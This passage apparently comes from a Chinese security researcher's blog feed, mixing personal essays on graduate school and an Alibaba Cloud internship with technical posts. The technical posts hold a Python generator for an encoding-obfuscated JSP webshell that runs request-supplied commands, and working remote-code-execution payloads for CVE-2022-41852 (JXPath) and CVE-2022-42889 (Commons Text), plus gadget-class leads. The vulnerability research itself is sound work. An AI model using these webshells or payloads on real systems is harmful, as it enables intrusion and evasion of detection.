class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">a0 = <span class="string">&#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&#x27;cp037&#x27;?&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line">a1 = <span class="string">&#x27;&#x27;&#x27;&lt;%</span></span><br><span class="line"><span class="string">    Process p = Runtime.getRuntime().exec(request.getParameter(&quot;y4tacker&quot;));</span></span><br><span class="line"><span class="string">    java.io.BufferedReader input = new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream()));</span></span><br><span class="line"><span class="string">    String line = &quot;&#x27;&#x27;&#x27;</span></span><br><span class="line">a2 = <span class="string">&#x27;&#x27;&#x27;&lt;%@ page pageEncoding=&quot;UTF-16BE&quot;%&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line">a3 = <span class="string">&#x27;&#x27;&#x27;&quot;;</span></span><br><span class="line"><span class="string">    while ((line = input.readLine()) != null) &#123;</span></span><br><span class="line"><span class="string">        out.write(line+&quot;\\n&quot;);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">%&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;test3.jsp&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(a0.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">    f.write(a1.encode(<span class="string">&quot;utf-16be&quot;</span>))</span><br><span class="line">    f.write(a2.encode(<span class="string">&quot;cp037&quot;</span>))</span><br><span class="line">    f.write(a3.encode(<span class="string">&quot;utf-16be&quot;</span>))</span><br></pre></td></tr></table></figure><p>生成三重编码文件</p><p><img src="/2022/11/27/year/2022/11/%E6%B5%85%E8%B0%88JspWebshell%E4%B9%8B%E7%BC%96%E7%A0%81/12.png"></p><p>测试利用</p><p><img src="/2022/11/27/year/2022/11/%E6%B5%85%E8%B0%88JspWebshell%E4%B9%8B%E7%BC%96%E7%A0%81/13.png"></p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>其实在这个过程当中还顺便发现了一个有趣的东西，虽然和讲编码的主题无关，但个人觉得比较有意思就顺便放在最后了，对于jsp不同的部分对应的空格判定是不同的</p><p>比如在对xml文件头做解析的时候(<code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;</code>)</p><p>这里调用的是<code>org.apache.jasper.xmlparser.XMLChar#isSpace</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isSpace</span><span class="params">(<span class="keyword">int</span> c)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> c &lt;= <span class="number">0x20</span> &amp;&amp; (CHARS[c] &amp; MASK_SPACE) != <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>省去给大家看常量浪费时间，这里当课代表总结一下就是四个字符<code>\x0d</code>、<code>\x0a9</code>、<code>\x0a</code>、<code>\x0d</code></p><p>而在识别<code>&lt;%@ page language=&quot;java&quot; pageEncoding=&quot;utf-16be&quot;%&gt;</code>这部分中对空格的判定调用的是<code>org.apache.jasper.compiler.JspReader#isSpace</code>，这里判断的空格只要保证在<code>\x20</code>之前即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">isSpace</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> peekChar() &lt;= <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然更多的部分就不多说啦，毕竟已经和本文由点偏离啦</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Webshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>读研的意义？</title>
      <link href="/2022/11/02/year/2022/11/%E8%AF%BB%E7%A0%94%E7%9A%84%E6%84%8F%E4%B9%89%EF%BC%9F/"/>
      <url>/2022/11/02/year/2022/11/%E8%AF%BB%E7%A0%94%E7%9A%84%E6%84%8F%E4%B9%89%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="读研的意义？"><a href="#读研的意义？" class="headerlink" title="读研的意义？"></a>读研的意义？</h1><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>​    每个人都有各自不同的处境，在每个阶段也会有自己不同的看法，我写这篇随笔也不是想去争论什么，只是觉得该记录一个状态，只是觉得我人生的一部分意义在于不断思考，而这部分思考我想留在未来某一天，闲暇饭余时间再翻开看看，也见证我个人的些许成长.</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>​    一切的源头还是来自于吃完泡面无意间看到的校友发的一篇灵魂发问帖子(顺便吐槽下可恶的坏蛋室友，两个人合伙吃泡面香我，馋啊…又白锻炼了)</p><p><img src="/2022/11/02/year/2022/11/%E8%AF%BB%E7%A0%94%E7%9A%84%E6%84%8F%E4%B9%89%EF%BC%9F/1.jpg"></p><p>对我而言，我以为很多时候我们选择读研就像当初为什么我们去选择高考一样，一是迫于社会环境，二是我们还很年轻，习惯于被别人安排好道路对家长老师的话只能言听计从，但很多时候我们身为学生确实也身不由己，只能走一步看一步，我们没有退路也没有多余的选择.</p><p>而对于我们不同的时间点也会有不同的想法</p><p>高中时期我在想什么呢？“班主任告诉我们大学很重要决定一生，读了研更是人上人！”</p><p>大一时期我在想什么呢？“我成绩这么好，不读研太浪费机会了”</p><p>大二时期经历一些事后，“读研似乎并不是我所要的，放弃吧，忘掉之前的成绩吧”</p><p>可虽说放弃，后面经历一些挫折之后也时不时想要回头，因为当时还是离不开周围对我的影响，总觉得胜利的天平开始倾斜</p><p>到了现在，经历前段时间保研风波以及秋招后，“接受崭新的自己吧，接受眼前的未知吧”</p><p>对于读不读研，如果放弃我们也必须承担放弃的风险，</p><p>这时候大概会有三种情况，</p><p>一是本来我本科出去确实也找不到一个很好的工作，读个研镀个金，喘两三年气，说不定我会有更好的平台</p><p>另一种情况是，我本科能找到一个很好的工作，读完研以后我可能连当初水平的工作都没有</p><p>至于最后一种，本科就很不错，读完研深造我变得更好了</p><p>这个时候其实已经进入了一个怪圈了，也就是我们的<strong>学生思维</strong></p><p>我们总是认为努力就会有收获，映射到生活中就是，我听课了就能有好成绩，我实习了就可以转正，我对你好你就会对我好，事实真的如此么？相信经历了这么多你也开始怀疑，怀疑本身并不可怕，但可怕的是，我们却一直只是在怀疑罢了，我们不敢去做出改变，这股奇怪的思想会一直笼罩着我们，从大一到大四，这时候你不得不面临选择了，但这时候你却突然发现你又没的选择，这时候我们就又进入了高中时期那般思考，而这种思考叫做依赖，我们一直依赖别人，依赖别人去帮我们做出选择，我们总是习惯呆在一个舒适圈当中，不愿去打破眼前的小美好，但其实<strong>社会并不会一直宠我们</strong>，我们需要尽早做出适应做出改变，走出父母的怀抱，成长都是痛苦的，这一路上必然会伴随着荆棘，也伴随着周围异样的目光，当然我也不排除有人天生就是智力高，运气就是好，只需要一点点的努力就能有很好的回报，但我也问过我自己，你觉得你是么？答案显而易见，不是，因此走出心里的舒适圈，拥抱变化才是我该做的。</p><p>在这个过程中我也一直很感激我的父母，感激我处于一个很开放的家庭，在家里我的身份是父母的孩子，但从大学后再行为上我明显更感受到我们是“同辈“，他们尊重我的每一个决定，我记得当初我对他们说“我放弃了某个很好学校的保研”，</p><p>他们的回答是<strong>“你想好了吗？我们还是认为读研对你会更好？但是我们毕竟什么也不懂，我们会尊重你的决定，但希望你再好好想想！”</strong></p><p>我很确信没有他们的支持我确实也走不到今天，因此我很感激我的父母，没有他们我不会获得这么自由。</p><p>好了今天就到这里，该说的也都说的差不多了，我也困了，该刷刷b站睡觉了…zzz</p><p><img src="/2022/11/02/year/2022/11/%E8%AF%BB%E7%A0%94%E7%9A%84%E6%84%8F%E4%B9%89%EF%BC%9F/2.gif"></p><h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><p>希望你看到这里，<strong>不要心里猛的冲动毁掉自己现有的成果</strong>，毕竟我们不能保证改变就会变好，就这个时间点来说可能会变得更差，也可能变得更好，我们也需要对这个世界一些妥协，为漫长的人生路增加一些抗风险的能力，也为你的人生多一点加分。当然我们也可以选择坚信，向着这个世界，对着未知发起冲撞，至于收获嘛，可能就是更多的坎坎坷坷，以及痛苦的成长了。</p><h2 id="写给学弟学妹们"><a href="#写给学弟学妹们" class="headerlink" title="写给学弟学妹们"></a>写给学弟学妹们</h2><p>​    希望看到这篇感想的是我大一大二的学弟学妹们，因为你们的可塑性还很强，还有短时期人生决定的能力，希望你们能认清自己，认清周围的环境，不要一味的看着成绩，一位想着只有读研这一条路子，适当的时候也给自己多条后路，说这些话我也并不鼓励你们都去无脑选择工作(更希望你是因为想工作而工作，不是因为自己的颓废而造成没得选)，毕竟我也从你们的阶段走过，我也理解你们各个时期的想法，当然最终不管是工作还是选择继续深造，我更希望你能坚定信心，开开心心的走下去。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅析Apache Commons Text(CVE-2022-42889)</title>
      <link href="/2022/10/29/year/2022/10/%E6%B5%85%E6%9E%90Apache-Commons-Text-CVE-2022-42889/"/>
      <url>/2022/10/29/year/2022/10/%E6%B5%85%E6%9E%90Apache-Commons-Text-CVE-2022-42889/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="浅析Apache-Commons-Text-CVE-2022-42889"><a href="#浅析Apache-Commons-Text-CVE-2022-42889" class="headerlink" title="浅析Apache Commons Text(CVE-2022-42889)"></a>浅析Apache Commons Text(CVE-2022-42889)</h1><p>前段时间我在知识星球上布置了一个小作业，算是赶在一个新的CVE发布之前做了个简单预警了</p><p><img src="/2022/10/29/year/2022/10/%E6%B5%85%E6%9E%90Apache-Commons-Text-CVE-2022-42889/1.png"></p><p>之后呢可以预见，Apache官方确实在几天后发布了一次更新，内容是<a href="https://lists.apache.org/thread/n2bd4vdsgkqh2tm14l1wyc3jyol7s1om%EF%BC%8C%E7%89%88%E6%9C%AC%E6%9B%B4%E6%96%B0%E4%BB%A5%E5%8F%8ACVE%E7%9A%84%E5%86%85%E5%AE%B9">https://lists.apache.org/thread/n2bd4vdsgkqh2tm14l1wyc3jyol7s1om，版本更新以及CVE的内容</a></p><p>其实总体而言这个的挖掘难度不算高，和前一段时间刚出的Apache Commons Configuration的RCE长的也基本一致，原理也不必多说</p><p>根据官方的demo呢，咋们也可以很容易看出它的基本用法以及漏洞出发点</p><p><img src="/2022/10/29/year/2022/10/%E6%B5%85%E6%9E%90Apache-Commons-Text-CVE-2022-42889/2.png"></p><p>简单的从<code>org.apache.commons.text.lookup.DefaultStringLookup</code>也可以看出，它支持一个script的用法</p><p><img src="/2022/10/29/year/2022/10/%E6%B5%85%E6%9E%90Apache-Commons-Text-CVE-2022-42889/3.png"></p><p>它对应于一个叫<code>org.apache.commons.text.lookup.ScriptStringLookup</code>的类，从它的lookup方法当中我们也可以看到，这就是我们平时RCE所常用到的执行JS实现RCE</p><p><img src="/2022/10/29/year/2022/10/%E6%B5%85%E6%9E%90Apache-Commons-Text-CVE-2022-42889/4.png"></p><p>因此POC也相对简单</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;script:js:java.lang.Runtime.getRuntime().exec(<span class="string">&quot;open -na Calculator&quot;</span>)&#125;</span><br></pre></td></tr></table></figure><p>整个漏洞比较简单，但从漏洞形式以及组件类型来说危害极大，但经过搜索发现网上开源项目中用到的虽然也有，但却看不见向官方demo当中提到的这种用法，当然也不排除一些内部厂商自己使用这样的写法，作为给新手学习了解这个洞还是不错的，因此也有在知识星球发小作业的形式.</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Apache Commons Text </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅析Apache Commons Jxpath命令执行分析(CVE-2022-41852)</title>
      <link href="/2022/10/13/year/2022/10/%E6%B5%85%E6%9E%90Apache-Commons-Jxpath%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90-CVE-2022-41852/"/>
      <url>/2022/10/13/year/2022/10/%E6%B5%85%E6%9E%90Apache-Commons-Jxpath%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90-CVE-2022-41852/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="浅析Apache-Commons-Jxpath命令执行分析-CVE-2022-41852"><a href="#浅析Apache-Commons-Jxpath命令执行分析-CVE-2022-41852" class="headerlink" title="浅析Apache Commons Jxpath命令执行分析(CVE-2022-41852)"></a>浅析Apache Commons Jxpath命令执行分析(CVE-2022-41852)</h1><p>本文首发于跳跳糖:<a href="https://tttang.com/archive/1771/">https://tttang.com/archive/1771/</a></p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>commons-jxpath:commons-jxpath &lt;= 1.3</p><p>一直到最新版本，官方也不打算修了</p><h2 id="利用探索"><a href="#利用探索" class="headerlink" title="利用探索"></a>利用探索</h2><p>测试环境：jxpath1.3</p><p>JXPath支持标准的XPath函数，开箱即用。它还支持 “标准 “扩展函数，这些函数基本上是通往Java的桥梁，以及完全自定义的扩展函数。</p><p>简单从漏洞描述可以看出由于解析xpath表达式的问题造成的漏洞<img src="/2022/10/13/year/2022/10/%E6%B5%85%E6%9E%90Apache-Commons-Jxpath%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90-CVE-2022-41852/1.png"></p><p>其实这来源官方的一个<a href="https://commons.apache.org/proper/commons-jxpath/users-guide.html">feature</a>，如图看起来它赋予了我们一种动态执行代码的能力</p><p><img src="/2022/10/13/year/2022/10/%E6%B5%85%E6%9E%90Apache-Commons-Jxpath%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90-CVE-2022-41852/2.png"></p><p>这时候我们就会想为什么会有这种奇怪的需求，毕竟从平时经验来讲xpath，作为一种路径语言，它的功能是帮助我们对xml进行一些简单的信息检索，然而它叫JXpath而不叫Xpath，因此其实从实现上来讲它不仅实现了xpath查询的一些基础功能，更重要的是它搭建了一个通往java的桥梁，从官方的设计初衷也可以看出，它的设计实现其实更像一款表达式语言</p><blockquote><p>Primary applications of JXPath are in scripting: JSP and similar template/script based technologies. However, programmers who prefer XML-flavored APIs, should consider JXPath as an alternative to other expression languages as well. JXPath is a must-have tool for those who work with mixtures of Java objects and XML and need to frequently traverse through graphs of those.</p></blockquote><h2 id="简单的测试"><a href="#简单的测试" class="headerlink" title="简单的测试"></a>简单的测试</h2><p>简单写个测试demo</p><p>Test.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.jxpath.JXPathContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        JXPathContext context = JXPathContext.newContext(<span class="keyword">null</span>);</span><br><span class="line">        context.getValue(<span class="string">&quot;com.example.springdemo.calc.calc()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Calc.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.springdemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">calc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">calc</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;open -na Calculator&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e )&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于如何解析其实很多时候我们并不需要去关注对字符token的解析过程，毕竟我们这也不是绕waf，我们也不需要知道如何去实现一些畸形构造达到一致的功能，而在这里我们更应该关注什么呢？我们应该关注它官网这个feature如何实现的调用，以及调用方法对方法又有什么限制？</p><p>在<code>org.apache.commons.jxpath.PackageFunctions#getFunction</code>当中</p><p><img src="/2022/10/13/year/2022/10/%E6%B5%85%E6%9E%90Apache-Commons-Jxpath%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90-CVE-2022-41852/3.png"></p><p>这里可以看出允许的调用一个是构造函数，另一个是静态方法，当然他们都需要是public修饰</p><p>再次回到<code>org.apache.commons.jxpath.ri.compiler.ExtensionFunction#computeValue</code>当中,</p><p><img src="/2022/10/13/year/2022/10/%E6%B5%85%E6%9E%90Apache-Commons-Jxpath%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90-CVE-2022-41852/4.png"></p><p>在获得了org.apache.commons.jxpath.Function对应的这个实例后，回去调用具体的invoke的实现</p><p>而Function具体的接口实现有两个类</p><ul><li>org.apache.commons.jxpath.functions.ConstructorFunction</li><li>org.apache.commons.jxpath.functions.MethodFunction</li></ul><p>如何判断返回的是哪个类？</p><p><img src="/2022/10/13/year/2022/10/%E6%B5%85%E6%9E%90Apache-Commons-Jxpath%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90-CVE-2022-41852/5.png"></p><p><code>ConstructorFunction</code>的<code>invoke</code>就不多说了，实例化构造函数，另一个<code>MethodFunction#invoke</code>，反射执行方法，都没什么好说的</p><p>那么我们假设就从官方的demo出发，我们能做些什么？</p><h3 id="对于实例化我们能做什么"><a href="#对于实例化我们能做什么" class="headerlink" title="对于实例化我们能做什么"></a>对于实例化我们能做什么</h3><p>比如说对于new这个操作来说，一些常见的如spring当中有两个类构造函数就能加载远程配置可以rce</p><ul><li>org.springframework.context.support.ClassPathXmlApplicationContext</li><li>org.springframework.context.support.FileSystemXmlApplicationContext</li></ul><h3 id="对于静态方法我们能做什么"><a href="#对于静态方法我们能做什么" class="headerlink" title="对于静态方法我们能做什么"></a>对于静态方法我们能做什么</h3><p>jndi当中有静态方法，javax.naming.InitialContext.doLookup</p><p>一些常见库比如fastjson出发json反序列化</p><p>当然还有jdbc攻击也可以帮助我们撕开一条漏洞的口子</p><p>当然肯定还有其他的攻击手法毕竟jre当中有很多类这里只是举一些例子而已，对于学习足够了</p><h3 id="想要更多？"><a href="#想要更多？" class="headerlink" title="想要更多？"></a>想要更多？</h3><p>拿着tabby编译扫一下就行，毕竟在这里我们规则很简单构造函数、静态方法，只是筛选可能会费点时间罢了</p><h2 id="突破限制"><a href="#突破限制" class="headerlink" title="突破限制"></a>突破限制</h2><p>​    对于大多数人来说，其实想到上面几点就已经很不错了，但是考虑的也不够全面。毕竟面向官方feature学习，下个断点，随便点点，也确实差不多了。</p><p>​    对我们来说虽然用spirng开发的项目很多，但是我们也不一定能遇到spring的环境，也不一定有jdbc可以打。</p><p>​    而对于JXpath来说，虽然设计的像表达式，但它却不像其他表达式引擎那般灵活，支持随意赋值然后调用。也不能多条语句执行，它一次只能执行一条，怎么办呢？事实上如果你仔细看了最后一个demo你会发现有个长这样的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String firstName = (String)context.getValue(<span class="string">&quot;getAuthorsFirstName($book)&quot;</span>);</span><br><span class="line"><span class="comment">//As you can see, the target of the method is specified as the first parameter of the function.</span></span><br></pre></td></tr></table></figure><p>从英文来看其实就是$book.getAuthorsFirstName()，就是这么的简单。稍微会点Java的你可能也该想到</p><p>如果我们想要执行<code>Runtime.getRuntime().exec(&quot;open -na Calculator&quot;)</code>，按照上面的例子其实就改为了<code>exec(java.lang.Runtime.getRuntime(),&#39;open -na Calculator&#39;)</code></p><p>又或者我们利用ScriptEngineManager调用js实现rce</p><p><code>eval(getEngineByName(javax.script.ScriptEngineManager.new(),&#39;js&#39;),&#39;java.lang.Runtime.getRuntime().exec(&quot;open -na Calculator&quot;)&#39;)</code></p><p>方法也便多了起来，有时候多往下面看看，真的可以节约很多时间，不然就需要仔细看看字符串的解析流程，属实无趣。</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Apache Commons Jxpath </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>保研or就业---阿里云实习之旅</title>
      <link href="/2022/10/11/year/2022/10/%E4%BF%9D%E7%A0%94or%E5%B0%B1%E4%B8%9A---%E9%98%BF%E9%87%8C%E4%BA%91%E5%AE%9E%E4%B9%A0%E4%B9%8B%E6%97%85/"/>
      <url>/2022/10/11/year/2022/10/%E4%BF%9D%E7%A0%94or%E5%B0%B1%E4%B8%9A---%E9%98%BF%E9%87%8C%E4%BA%91%E5%AE%9E%E4%B9%A0%E4%B9%8B%E6%97%85/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="保研or就业-—-阿里云实习之旅"><a href="#保研or就业-—-阿里云实习之旅" class="headerlink" title="保研or就业 — 阿里云实习之旅"></a>保研or就业 — 阿里云实习之旅</h1><h2 id="始章"><a href="#始章" class="headerlink" title="始章"></a>始章</h2><p>​    昨天刚回成都，之前一直在问自己结果真的有那么重要吗，现在我也能鼓起勇气对自己说，不重要了，我的世界属于我，我的人生也没有那么多的观众，我也没必要在意他人的目光，我终于又成长了一点。</p><h2 id="实习经历"><a href="#实习经历" class="headerlink" title="实习经历"></a>实习经历</h2><p>​    （经历这部分就挑着重点的或者和时间性有关的说说，我也懒）</p><p>​    七月中旬收拾好行李独自前往一个陌生的城市，起初对杭州的影响也就是赛博群里说的饭不好吃，说我这个成都人一定不习惯(Ps:不过外卖还是很不错的)，到了杭州浅浅收视了下房间，便被徐师叫出去干饭了，主管确实是一个很好也很热情的人，在吃饭过程中帮助我开始熟悉环境，也在这个过程中有了对工作的简单认知(Ps:至少知道了咋是做Waf产品和RASP产品).</p><p>​    第一天刚上班的时候，懵懵懂懂不知道干什么，索性在公司发的新电脑上边配置环境边研究着来之前没搞完的安全研究。到了第二天，主管拉我去开会帮助我确定了我实习期间的内容，总体而言还是很好的，给了我很多自由发展的空间。有着公司提供的各种资源，第一个月也是我技术成长最快的时候；一方面我很喜欢研究新的东西，另一方面我还是和以前一样的无所顾忌。当然这时候的我也不喜欢思考只想着这个技术点有意思就研究它，毕竟在我心里一直以来的想法都是我就认认真真搞个技术，需要考虑那么多么。在第一个月的实习过程中，也凭借着自己的努力帮助产品找到了一些潜在隐患，在工作方面也得到了师兄的认可。</p><p>​    转眼到了第二个月，秋招来了，但秋招和我其实一直没啥关系，毕竟每天上下班时间里我也不可能去面试，那时听说八月是提前批，虽然自己没办法参加秋招但不影响我好奇一些整体的情况，于是乎打开了脉脉开始了我的心态之旅(Ps:脉脉治好了我的精神内耗，也让我成长了不少)，和我想的一样，今年整体形势并不乐观，很多人在上面埋怨怎么怎么滴不好。那时候我也没想很多，偶尔也会拿着图去群里调侃，后来渐渐吃瓜吃到了自己，看到了阿里的一些消息，我也开始逐渐担心起自己来了，担心自己没时间面试其他公司如果这边没过怎么办，在中途我也向主管表示过我的担心，尽管主管也拉我谈过话我也没法消除这个疑虑，毕竟很现实的问题我至少得有个工作吧，当然其实这时候这方面想法对我影响并不大，毕竟秋招才到提前批，时间接着往下走终于到了正式批，这时候我又看到了另一个消息，“阿里云今年卡本科学历，不是硕士不能参加转正答辩”，这时候噩梦终于开始了，毕竟听到这个消息时九月已经过了1/3了，这时候我也经常和师兄吐槽xxx，徐师也找过我帮我缓解了一些焦虑，我也继续做着我的实习工作，在这期间也向补天白帽大会投了自己的议题，很高兴的也过了审核。</p><p>​    到了第三个月，我也顺理成章收到了准备转正答辩的事情，不得不说徐师人真的很好，其实我平时是很少做PPT的，做的话也是那种凑合着能用的类型，毕竟在学校期间我通常也只是技术输出，并不喜欢花很多时间到文稿上。在这期间主管和师兄确实帮了我很多，前有师兄帮助梳理逻辑，后有徐师手把手修改我的PPT。之后也顺利参加了转正答辩，虽然效果不是很好，毕竟我也很难从一个纯技术人的角度做快速的转变，对讲PPT我也只是个新人。答辩完以后我也书归正传继续自己的一些学习研究，时间就这样走着终于最后一个导火索来了，在看到阿里实习群里小伙伴说，“阿里云今年本科生转正需要特批，基本不可能“，这一点最终也被大主管得到了证实，我也终于绷不住了，眼泪也流了下来，为什么会哭？原因很简单就是世界观的崩塌。我这么多年的努力真的就白费了么？当年我的选择不就是放弃学习努力学技术然后工作么？不是说好了只要技术ok一切都会好的么？我不断反问自己，一直没法说服自己，这个时间也是我最迷茫的时刻，还好我的主管和师兄也没有因为这件事放弃我，我也如愿走了特批流程，至于结果就慢慢等吧，take it easy，毕竟也不是我能决定的，我做好我的一切就够了。某天晚上骑车回家的路上想起了大二的自己，那时候无畏，敢冲撞，有力量，敢放弃已有的成绩，投身技术，那时候每天起早贪黑只有一个目标，变强，从来也不为结果，但自从实习开始一方面因为周围的负面情绪开始腐化了自己，另一方面一直以来也有些许的精神内耗，忘了自己的本心。</p><h2 id="为什么还是选择了就业"><a href="#为什么还是选择了就业" class="headerlink" title="为什么还是选择了就业"></a>为什么还是选择了就业</h2><p>​    在这期间也发生了一件事，因此也单独列在最后了，虽然确实从大二开始，由于当时决定放弃保研准备工作，因而我平时上课也没听课，期末也就是靠着一个月的时间简单看看课本了解下名词，成绩也不算好，一不小心就保研了也很意外，在最终决定是否接受这个保研名额的那一天也正好是主管问我是否决定特批的那一天，一切都是那么巧合，主管确实人也很好，告诉我先别下结论他帮我了解下特批成功率大不大，不过在主管离开的那一刻我也并没有犹豫多久，写了一份放弃保研资格的说明到了学院，虽然我也不知道自己转正成功率如何，但我想当我在放弃保研资格上写下最后署名的那一刻起，我也不再迷茫了，毕竟我也不喜欢那种一眼就能看到底的生活，我还是那么的喜欢冒险，喜欢未知，在这之后赛博群很多人都说我应该选择读研，也给我讲了读研的好处。但谁叫我从小就是个特立独行的主呢？虽然我的选择也不一定正确，但至少符合我的当下。少年是不需要向生活妥协的，原因嘛？我还狠年轻，我也不想留下遗憾。</p><h2 id="终章"><a href="#终章" class="headerlink" title="终章"></a>终章</h2><p>​    回想起来这段时间成长无疑是迅速的</p><p>​    对于技术有了更多维度的思考，开始从臆想阶段发生转变，慢慢开始思考眼下做的东西具体意义是什么，是否能解决一些具体问题，当然这方面也只是刚起步，我也仍在不断学习。</p><p>​    对于生活，有了更多的体验，迈出了很多的第一步，买了第一辆公路车，有了自己的小相机。</p><p>​    当然最主要的是彻底治好了我的精神内耗，从大学起搞出来的老毛病，间歇性担心某个结果，忽略了过程的意义。经过实习这一遭基本是完全治好了，尽管到目前为止也看着身边阿里的实习朋友们都拿到了意向，虽然我这边也一直没动静，但这又有什么关系呢，我已经尽力做到了自己的最好，这就足够了。</p><p><img src="/2022/10/11/year/2022/10/%E4%BF%9D%E7%A0%94or%E5%B0%B1%E4%B8%9A---%E9%98%BF%E9%87%8C%E4%BA%91%E5%AE%9E%E4%B9%A0%E4%B9%8B%E6%97%85/1.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>临行随笔</title>
      <link href="/2022/07/09/year/2022/7/%E4%B8%B4%E8%A1%8C%E9%9A%8F%E7%AC%94/"/>
